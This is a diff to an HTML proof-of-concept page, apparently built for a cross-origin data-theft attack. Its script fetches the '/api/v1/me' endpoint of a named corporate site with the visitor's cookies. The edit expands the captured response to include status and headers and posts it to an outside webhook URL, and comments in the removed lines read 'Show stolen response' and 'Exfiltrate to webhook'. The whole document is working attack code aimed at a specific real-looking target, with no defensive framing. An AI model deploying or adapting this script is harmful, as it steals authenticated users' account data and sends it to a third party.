@@ -6,28 +6,27 @@
 <pre id="out">Loading...</pre>
 
 <script>
-
 fetch("https://advisortimetracker.kkr.com/api/v1/me", {
   credentials: "include"
 })
-.then(r => r.text())
-.then(data => {
-
-  // Show stolen response
-  document.getElementById("out").textContent = data;
-
-  // Exfiltrate to webhook
+.then(async r => {
+  const text = await r.text();
+  const payload = JSON.stringify({
+    url: "https://advisortimetracker.kkr.com/api/v1/me",
+    status: r.status,
+    headers: [...r.headers],
+    body: text
+  });
+  document.getElementById("out").textContent = payload;
   fetch("https://d90c361b-91e4-4399-8c78-7b57e7743bca.webhooksite.net", {
     method: "POST",
     mode: "no-cors",
-    body: data
+    body: payload
   });
-
 })
 .catch(e => {
   document.getElementById("out").textContent = e;
 });
-
 </script>
 
 </body>
